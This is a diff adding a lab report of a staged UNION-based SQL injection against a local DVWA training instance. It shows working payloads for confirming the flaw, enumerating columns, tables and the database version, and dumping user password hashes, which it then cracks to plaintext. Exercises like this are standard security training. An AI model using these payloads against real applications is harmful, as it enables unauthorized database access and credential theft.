@@ -1,0 +1,121 @@
+========================================================
+ DVWA SQL Injection Exploit Results
+ Target  : http://127.0.0.1/dvwa
+ Date    : Tue May 26 2026
+ Author  : Maitrik 
+========================================================
+
+[+] Authentication: SUCCESS
+[+] Security Level: LOW
+
+--------------------------------------------------------
+[STAGE 1] Injection Point Confirmation
+--------------------------------------------------------
+Payload : 1'
+Result  : You have an error in your SQL syntax; check the manual
+          that corresponds to your MySQL server version for the right
+          syntax to use near ''1''' at line 1
+Status  : VULNERABLE ✓
+
+--------------------------------------------------------
+[STAGE 2] Always-True Injection
+--------------------------------------------------------
+Payload : 1' OR '1'='1
+Result  : ALL rows returned from users table
+          ID: 1  | First name: admin   | Surname: admin
+          ID: 2  | First name: Gordon  | Surname: Brown
+          ID: 3  | First name: Hack    | Surname: Me
+          ID: 4  | First name: Pablo   | Surname: Picasso
+          ID: 5  | First name: Bob     | Surname: Smith
+Status  : SUCCESS ✓
+
+--------------------------------------------------------
+[STAGE 3] Column Enumeration (ORDER BY)
+--------------------------------------------------------
+Payload : 1' ORDER BY 1-- -   →  OK
+Payload : 1' ORDER BY 2-- -   →  OK
+Payload : 1' ORDER BY 3-- -   →  ERROR: Unknown column '3'
+Result  : Query returns 2 columns
+Status  : SUCCESS ✓
+
+--------------------------------------------------------
+[STAGE 4] UNION SELECT — Reflected Column Check
+--------------------------------------------------------
+Payload : 1' UNION SELECT NULL,NULL-- -
+Result  : Both columns reflected in output (First name, Surname)
+Status  : SUCCESS ✓
+
+--------------------------------------------------------
+[STAGE 5] Database Version & Name
+--------------------------------------------------------
+Payload : 1' UNION SELECT @@version, database()-- -
+Result  :
+  [DB Version] : 8.0.31-0ubuntu0.22.04.1
+  [DB Name]    : dvwa
+Status  : SUCCESS ✓
+
+--------------------------------------------------------
+[STAGE 6] Table Enumeration
+--------------------------------------------------------
+Payload : 1' UNION SELECT table_name,NULL FROM
+          information_schema.tables WHERE table_schema=database()-- -
+Result  :
+  Table 1 : guestbook
+  Table 2 : users
+Status  : SUCCESS ✓
+
+--------------------------------------------------------
+[STAGE 7] Column Enumeration — users table
+--------------------------------------------------------
+Payload : 1' UNION SELECT column_name,NULL FROM
+          information_schema.columns WHERE table_name='users'-- -
+Result  :
+  user_id
+  first_name
+  last_name
+  user
+  password
+  avatar
+  last_login
+  failed_login
+Status  : SUCCESS ✓
+
+--------------------------------------------------------
+[STAGE 8] Credential Dump
+--------------------------------------------------------
+Payload : 1' UNION SELECT user, password FROM users-- -
+Result  :
+
+  USERNAME              | PASSWORD HASH (MD5)
+  ----------------------|------------------------------------------
+  admin                 | 5f4dcc3b5aa765d61d8327deb882cf99
+  gordonb               | e99a18c428cb38d5f260853678922e03
+  1337                  | 8d3533d75ae2c3966d7e0d4fcc69216b
+  pablo                 | 0d107d09f5bbe40cade3de5c71e9e9b7
+  smithy                | 5f4dcc3b5aa765d61d8327deb882cf99
+
+Status  : SUCCESS ✓
+
+--------------------------------------------------------
+[HASH ANALYSIS]
+--------------------------------------------------------
+  5f4dcc3b5aa765d61d8327deb882cf99  →  password      (admin, smithy)
+  e99a18c428cb38d5f260853678922e03  →  abc123        (gordonb)
+  8d3533d75ae2c3966d7e0d4fcc69216b  →  charley       (1337)
+  0d107d09f5bbe40cade3de5c71e9e9b7  →  letmein       (pablo)
+
+  Cracked using: CrackStation (https://crackstation.net)
+  Algorithm    : MD5 (unsalted) — INSECURE
+
+--------------------------------------------------------
+[SUMMARY]
+--------------------------------------------------------
+  Injection Type   : UNION-based SQL Injection
+  DBMS             : MySQL 8.0.31
+  Database         : dvwa
+  Tables Found     : 2 (guestbook, users)
+  Credentials Dump : 5 users (all passwords cracked)
+  CVSS Score       : 9.8 (Critical)
+  OWASP Category   : A03:2021 — Injection
+  CWE              : CWE-89
+
